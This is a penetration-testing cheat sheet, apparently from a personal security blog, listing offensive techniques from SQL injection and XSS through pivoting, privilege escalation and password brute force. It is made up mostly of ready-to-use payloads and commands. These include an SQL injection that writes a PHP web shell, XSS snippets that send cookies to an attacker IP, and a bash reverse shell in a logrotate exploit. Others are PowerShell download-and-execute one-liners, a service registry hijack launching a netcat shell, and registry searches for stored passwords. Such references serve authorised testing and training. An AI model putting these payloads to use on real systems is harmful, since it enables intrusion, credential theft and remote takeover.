[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)

* TOC
{:toc}






## ExecutionPolicy Bypass

* [blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
* [bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/](https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/)



















## SQLi



### sqlmap

* [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)

Write file:

```
$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
```

Test WAF:

```
$ sqlmap.py -u 'https://127.0.0.1' --data='{"param":"*"}' -p 'param' -v3 --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 --batch
```

* [www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)



### DIOS

MySQL:

```
id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a) IN (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -

SELECT (@a) FROM (
	SELECT(@a:=0x00), (
		SELECT (@a) FROM (information_schema.schemata)
		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
	)
) foo
```

```
id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (mytable.users) WHERE (@a) IN (@a:=concat(@a,':::',id,':::',login,':::',password)) AND is_admin='1'))a);-- -
```

* [defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
* [www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
* [dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
* [www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)



### Truncation Attack

```
POST /index.php HTTP/1.1
Host: 127.0.0.1

name=snovvcrash&email=admin%example.com++++++++++11&password=qwe12345
```

* [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)



### Commas blocked by WAF

```
id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
```



### Write File

```
id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1' );} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
```



### Read File

```
id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
```




## XSS



### Redirections

```html
<head> 
  <meta http-equiv="refresh" content="0; URL=http://www.example.com/" />
</head>
```

* [developer.mozilla.org/ru/docs/Web/HTTP/Redirections](https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections)



### Data Grabbers


#### Cookies

Img tag:

```
<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">
```

Fetch:

```javascript
<script>
fetch('https://<SESSION>.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>
```

* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)



### XMLHttpRequest


#### XSS to LFI

```javascript
<script>
var xhr = new XMLHttpRequest;
xhr.onload = function() {
	document.write(this.responseText);
};
xhr.open("GET", "file:///etc/passwd");
xhr.send();
</script>
```

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText);};x.open("GET","file:///etc/passwd");x.send();</script>
```

* [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)


#### XSS to CSRF

If the endpoint is accessible only from localhost:

```javascript
<script>
var xhr;
if (window.XMLHttpRequest) {
	xhr = new XMLHttpRequest();
} else {
	xhr = new ActiveXObject("Microsoft.XMLHTTP");
}
xhr.open("POST", "/backdoor.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
</script>
```

With capturing CSRF token first:

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('GET', '/email', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@example.com')
};
</script>
```

* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)




## Metasploit



### Debug

```
root@kali:$ gem install pry-byebug
root@kali:$ vi ~/.pry-byebug
...
```

```ruby
if defined?(PryByebug)
  Pry.commands.alias_command 'c', 'continue'
  Pry.commands.alias_command 's', 'step'
  Pry.commands.alias_command 'n', 'next'
  Pry.commands.alias_command 'f', 'finish'
end

# Hit Enter to repeat last command
Pry::Commands.command /^$/, "repeat last command" do
  _pry_.run_command Pry.history.to_a.last
end
```

```
...
root@kali:$ cp -r /usr/share/metasploit-framework/ /opt
root@kali:$ vi /opt/metasploit-framework/msfconsole
...add "require 'pry-byebug'"...
root@kali:$ mkdir -p ~/.msf4/modules/exploits/linux/http/
root@kali:$ cp /usr/share/metasploit-framework/modules/exploits/linux/http/packageup.rb ~/.msf4/modules/exploits/linux/http/p.rb
root@kali:$ vi ~/.msf4/modules/exploits/linux/http/p.rb
...add "binding.pry"...
```

1. [github.com/deivid-rodriguez/pry-byebug](https://github.com/deivid-rodriguez/pry-byebug)
2. [www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)




## Information Gathering

* [pentest-tools.com/home](https://pentest-tools.com/home)
* [hackertarget.com/ip-tools/](https://hackertarget.com/ip-tools/)



### Google Dorks

```
site:example.com filetype:(doc | docx | docm | xls | xlsx | xlsm | ppt | pptx | pptm | pdf | rtf | odt | xml | txt)
site:example.com ext:(config | cfg | ini | log | bak | backup | dat)
site:example.com ext:(php | asp | aspx)
"@example.com" email e-mail
```



### Autonomous Systems

* [hackware.ru/?p=9245](https://hackware.ru/?p=9245)


#### via IP

dig:

```
root@kali:$ dig $(dig -x 127.0.0.1 | grep PTR | tail -n 1 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}').origin.asn.cymru.com TXT +short
```

whois:

```
root@kali:$ whois -h whois.cymru.com -- '-v 127.0.0.1'
root@kali:$ whois -h whois.radb.net 127.0.0.1
```


#### via ASN

whois:

```
root@kali:$ whois -h whois.cymru.com -- '-v AS48666'
root@kali:$ whois -h whois.radb.net AS48666
```



### DNS


#### whois

IP/domain info, IP ranges:

```
root@kali:$ whois [-h whois.example.com] example.com или 127.0.0.1
```


#### dig

General:

```
root@kali:$ dig [@dns.example.com] example.com [{any,a,mx,ns,soa,txt,...}]
root@kali:$ dig -x example.com [+short] [+timeout=1]
```

* [viewdns.info/reverseip/](https://viewdns.info/reverseip/)

Zone transfer:

```
root@kali:$ dig axfr @dns.example.com example.com
```


#### nslookup

```
root@kali:$ nslookup example.com (или 127.0.0.1 для PTR)

root@kali:$ nslookup
[> server dns.example.com]
> set q=mx
> example.com

root@kali:$ nslookup
> set q=ptr
> 127.0.0.1
```


#### DNS Amplification

Check:

```
$ host facebook.com ns.example.com
$ dig +short @ns.example.com test.openresolver.com TXT
$ nmap -sU -p53 --script=dns-recursion ns.example.com
```



### SMTP

Check if sender could be [forged](https://en.wikipedia.org/wiki/Callback_verification) with an domain user:

```
$ telnet mail.example.com 25
HELO example.com
MAIL FROM: <forged@exmaple.com>
RCPT TO: <exists@example.com>
RCPT TO: <exists@gmail.com>
```

Check if sender could be forged with a non-domain user:

```
$ telnet mail.example.com 25
HELO example.com
MAIL FROM: <forged@gmail.com>
RCPT TO: <exists@example.com>
RCPT TO: <exists@gmail.com>
```

Check if domain users could be enumerated with `VRFY` and `EXPN`:

```
$ telnet mail.example.com 25
HELO example.com
VRFY exists@exmaple.com
EXPN exists@exmaple.com
```

Check if users could be enumerated with `RCPT TO`:

```
$ telnet mail.example.com 25
HELO example.com
MAIL FROM: <...>
RCPT TO: <exists@exmaple.com>
DATA
From: <...>
To: <exists@exmaple.com>
Subject: Job offer
Hello, I would like to offer you a great job!
.
QUIT
```




## IPSec



### IKE

* [xakep.ru/2015/05/13/ipsec-security-flaws/](https://xakep.ru/2015/05/13/ipsec-security-flaws/)
* [book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting](https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting)
* [www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/)

Generate list of all transform-sets:

```
$ for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "$ENC,$HASH,$AUTH,$GROUP" >> trans-dict.txt; done; done; done; done
```

Brute force supported transform-sets:

```
$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M --trans=$t <IP>) |grep -B14 "1 returned handshake" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
Or (for aggressive mode)
$ while read t; do (echo "[+] Valid trans-set: $t"; sudo ike-scan -M -A -P'handshake.txt' -n FAKEID --trans=$t <IP>) |grep -B7 "SA=" |grep "Valid trans-set" |tee -a trans.txt; done < trans-dict.txt
Or
$ sudo python ikeforce.py -s1 -a <IP>  # -s1 for max speed
```

Get information about vendor:

```
$ sudo ike-scan -M --showbackoff --trans=<TRANSFORM-SET> <IP>
```

Test for aggressive mode ON:

```
$ sudo ike-scan -M -A -P -n FAKEID --trans=<TRANSFORM-SET> <IP>
```

If no hash value is returned then brute force is (maybe also) possible:

```
$ while read id; do (echo "[+] Valid ID: $id" && sudo ike-scan -M -A -n $id --trans=<TRANSFORM-SET> <IP>) | grep -B14 "1 returned handshake" | grep "Valid ID" |tee -a group-id.txt; done < dict.txt
Or
$ sudo python ikeforce.py <IP> -e -w wordlists/groupnames.dic t <TRANSFORM-SET-IN-SEPARATE-ARGS>

Dicts:
- /usr/share/seclists/Miscellaneous/ike-groupid.txt
- ~/tools/ikeforce/wordlists/groupnames.dic
```




## Discovery



### nmapAutomator

```
$ sudo apt install sslscan nikto joomscan wpscan smbmap enum4linux dnsrecon
$ sudo python3 -m pip install droopescan
$ sudo wget https://github.com/vulnersCom/nmap-vulners/raw/master/vulners.nse -O /usr/share/nmap/scripts/vulners.nse && nmap --script-updatedb
$ git clone https://github.com/21y4d/nmapAutomator ~/tools/nmapAutomator
$ sudo ln -s ~/tools/nmapAutomator/nmapAutomator.sh /usr/local/bin/nmapAutomator.sh
```



### AutoRecon

```
$ sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
$ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
```




## Pivoting

* [PayloadsAllTheThings/Network Pivoting Techniques.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)



### Chisel

1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
2. [snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)

* Attacker's IP: 10.10.13.37
* Victims's IP: 10.10.13.38

Reverse forward port 1111 from Windows machine to port 2222 on Linux machine:

```
root@kali:$ wget [1/linux]
root@kali:$ gunzip chisel*.gz && rm chisel*.gz && mv chisel* chisel && chmod +x chisel

root@kali:$ wget [1/windows]
root@kali:$ gunzip chisel*.exe.gz && rm chisel*.exe.gz && mv chisel*.exe chisel.exe && upx chisel.exe
root@kali:$ md5sum chisel.exe

root@kali:$ ./chisel server -p 8000 -v --reverse

PS > (new-object net.webclient).downloadfile("http://10.10.13.37/chisel.exe", "$env:userprofile\music\chisel.exe")
PS > get-filehash -alg md5 chisel.exe
PS > Start-Process -NoNewWindows chisel.exe client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111
```

Socks5 proxy with Chisel in server mode:

```
1. user@victim:$ ./chisel server -p 8000 --socks5 &
2. root@kali:$ ./chisel client 10.10.13.38:8000 socks
```

Socks5 proxy with Chisel in server mode when direct connection to server is not available (not relevant as Chisel now supports socks5 in client mode):

```
1. root@kali:$ ./chisel server -p 8000 --reverse
2. user@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
3. user@victim:$ ./chisel server -v -p 8002 --socks5 &
4. root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
```

Socks5 proxy with Chisel in client mode:

```
1. root@kali:$ ./chisel server -p 8000 --reverse --socks5
2. user@victim:$ ./chisel client 10.10.13.37:8000 R:socks
```



### revsocks

* [github.com/kost/revsocks](https://github.com/kost/revsocks)

```
1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
```




## Post Exploitation



### Linux


#### Recon

Find and list all files newer than `2020-03-16` and not newer than `2020-03-17`:

```
user@vict:$ find / -type f -readable -newermt '2020-03-16' ! -newermt '2020-03-17' -ls 2>/dev/null
```

Find SUID binaries:

```
# User
find / -type f -perm /4000 -ls 2>/dev/null
# Group
find / -type f -perm /2000 -ls 2>/dev/null
# Both
find / -type f -perm /6000 -ls 2>/dev/null
```

##### Tools

`LinEnum.sh`:

```
root@kali:$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && python3 -m http.server 80
user@vict:$ wget 127.0.0.1/LinEnum.sh -qO- |bash
```

`lse.sh`:

```
root@kali:$ wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && python3 -m http.server 80
user@vict:$ wget 127.0.0.1/lse.sh -qO- |bash
```

`linPEAS.sh` (linPEAS):

```
root@kali:$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh && python3 -m http.server 80
user@vict:$ wget 127.0.0.1/linpeas.sh -qO- |sh
```

`pspy`:

```
root@kali:$ wget [1] && python3 -m http.server 80
user@vict:$ wget 127.0.0.1/pspy -qO /dev/shm/pspy && cd /dev/shm && chmod +x pspy
user@vict:$ ./pspy
```

1. [github.com/DominicBreuker/pspy/releases](https://github.com/DominicBreuker/pspy/releases)


#### Rootkits

* [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)



### Windows


#### Recon

PowerShell history:

```
PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

##### Tools

winPEAS:

```
root@kali:$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ~/tools/privilege-escalation-awesome-scripts-suite
root@kali:$ cp ~/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
PS > (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
```

PowerUp.ps1:

* [github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
* [github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
* [recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)

```
$ curl -L https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 > powerup.ps1
PS > Invoke-PrivescAudit
```

Sherlock.ps1:

```
root@kali:$ wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1 && python3 -m http.server 80
powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
PS > powershell.exe -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File sherlock.txt}"
```

Watson:

* [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)

JAWS:

```
root@kali:$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
```

PrivescCheck:

* [github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

```
Cmd > powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object result.txt"
```

Windows-Exploit-Suggester:

* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```
$ python -u windows-exploit-suggester.py -d 1970-01-01-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
```


#### Remote Admin

##### runas

```
PS > runas /netonly /user:snovvcrash powershell
```

##### evil-winrm.rb

* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
* [malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)

Install:

```
$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
$ cd ~/tools/evil-winrm && bundle install && cd -
$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
```

Run:

```
$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
```

##### psexec.py

```
root@kali:$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1
root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
```

* [github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

##### wmiexec.py

```
root@kali:$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
```

* [github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)


#### Registry & Filesystem

```
PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
PS > cmd /c where /R C:\ *.ini
PS > reg query HKLM /f "password" /t REG_SZ /s
PS > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
Or
PS > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy
```


#### SDDL

1. [habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
2. [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)




## LPE

* [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)



### Linux


#### Dirty COW

* [dirtycow.ninja/](https://dirtycow.ninja/)
* [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
* [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)


#### logrotate

whotwagner/logrotten:

```
$ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
$ gcc lr.c -o lr

$ cat payloadfile
if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi

$ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
```

* [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
* [tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
* [tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
* [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)


#### motd

`/etc/update-motd.d/`:

```
root@kali:$ shellpop --reverse --number 8 -H 127.0.0.1 -P 1337 --base64
root@kali:$ echo '<BASE64_SHELL>' >> 00-header
* Fire up new SSH session and catch the reverse shell
```

* [www.securityfocus.com/bid/50192/discuss](https://www.securityfocus.com/bid/50192/discuss)

PAM MOTD:

* [www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
* [www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)



### Windows


#### Windows-Exploit-Suggester

* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```
$ sudo python -m pip install xlrd
$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
```


#### PowerShell

Run as another user:

```
PS > $user = '<HOSTNAME>\<USERNAME>'
PS > $pass = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
PS > $cred = New-Object System.Management.Automation.PSCredential($user, $pass)

PS > Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
Or
PS > $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
PS > Invoke-Command -ScriptBlock { whoami } -Session $s
```


#### Potatoes

foxglovesec/RottenPotato **[1]**, **[2]**:

```
meterpreter > upload [3]
meterpreter > load incognito
meterpreter > execute -cH -f rottenpotato.exe
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

1. [github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)
2. [foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
3. [github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe](https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe)

ohpe/juicy-potato **[1]**, **[2]**:

```
Cmd > certutil -urlcache -split -f http://127.0.0.1/[3] C:\Windows\System32\spool\drivers\color\j.exe
Cmd > certutil -urlcache -split -f http://127.0.0.1/rev.bat C:\Windows\System32\spool\drivers\color\rev.bat
root@kali:$ nc -lvnp 443
Cmd > j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

```bat
;= rem rev.bat

cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[4]')
```

1. [github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
2. [ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
3. [github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
4. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)


#### wuauserv

```
PS > Get-Acl HKLM:\SYSTEM\CurrentControlSet\services\* | format-list * | findstr /i "snovvcrash Users Path ChildName"
PS > Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv
PS > reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.16 1337 -e powershell" /f
PS > Start-Service wuauserv
...get reverse shell...
PS > Get-Service wuauserv
PS > Stop-Service wuauserv
```




## Auth Brute Force



### Hydra

```
root@kali:$ hydra -V -t 20 -f -I -L logins.lst -P /usr/share/john/password.lst 127.0.0.1 -s 8888 smtp
root@kali:$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 8888 ftp
```



### Patator

```
root@kali:$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
root@kali:$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
```




## Password Brute Force



### hashcat

```
$ hashcat --example-hashes | grep -B1 -i md5
$ hashcat -m 500 hashes/file.hash /usr/share/wordlists/rockyou.txt --username
$ hashcat -m 500 hashes/file.hash --username --show
```

Benchmarks:

```
root@kali:$ nvidia-smi.exe

# MD5
root@kali:$ ./hashcat64.exe -m 0 -b
# NTLM
root@kali:$ ./hashcat64.exe -m 1000 -b
```

| Единица хэшрейта  |           Хэшрейт             | Хэши в секунду  |
|-------------------|-------------------------------|-----------------|
| 1kH/s             |                          1000 | Тысяча          |
| 1MH/s             |                       1000000 | Одинмиллион     |
| 1GH/s             |                    1000000000 | Одинмиллиард    |
| 1TH/s             |             1.000.000.000.000 | Одинтриллион    |
| 1PH/s             |         1.000.000.000.000.000 | Одинквадриллион |
| 1EH/s             |     1.000.000.000.000.000.000 | Одинквинтиллион |
| 1ZH/s             | 1.000.000.000.000.000.000.000 | Одинсекстиллион |





# Engagement

```
root@kali:$ mkdir -p discovery/{subnets,hosts,services/names} exploitation/ loot/ report/{logs,screenshots}
```




## Network Status

```
root@kali:$ ip addr (ifconfig)
root@kali:$ ip route (route -n)
root@kali:$ cat /etc/resolve.conf
root@kali:$ arp -a
```




## Host Discovery

CWD: `discovery/`



### ARP

* [edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html](http://edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html)
* [null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/](https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/)


#### arp-scan

Active:

```
root@kali:$ arp-scan -l [-s <SPOOFED_IP>] -v
root@kali:$ arp-scan -I eth0 192.168.0.1/24
```


#### netdiscover

Passive:

```
root@kali:$ netdiscover -i eth0 -r 192.168.0.1/24 -p
```

Active, sending 20 requests per IP:

```
root@kali:$ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
```



### Hunting for Subnets

* [hub.packtpub.com/optimize-scans/](https://hub.packtpub.com/optimize-scans/)

Take `10.0.0.0/8` as an example:

```
root@kali:$ nmap -n -sn 10.0-255.0-255.1 -oA subnets/gateways -PE --min-rate 10000 --min-hostgroup 10000
root@kali:$ grep 'Up' subnets/gateways.gnmap |cut -d' ' -f2 > subnets/ranges.txt

root@kali:$ sed -i subnets/ranges.txt -e 's/$/\/24/'
```

Passive traffic analyze. Look for broadcast/multicast, IPv6 packets:

* ARP
* LLMNR, NBNS
* STP
* DHCPv6, ICMPv6
* mDNS


#### Network attacks

##### ARP Spoofing

```
root@kali:$ arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
```

* [www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)

##### LLMNR/NBNS Poisoning

Responder:

* [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
* [github.com/lgandx/Responder](https://github.com/lgandx/Responder)

```
$ git clone https://github.com/lgandx/Responder
$ ./Responder.py -I eth0 -vwrf
```

Inveigh:

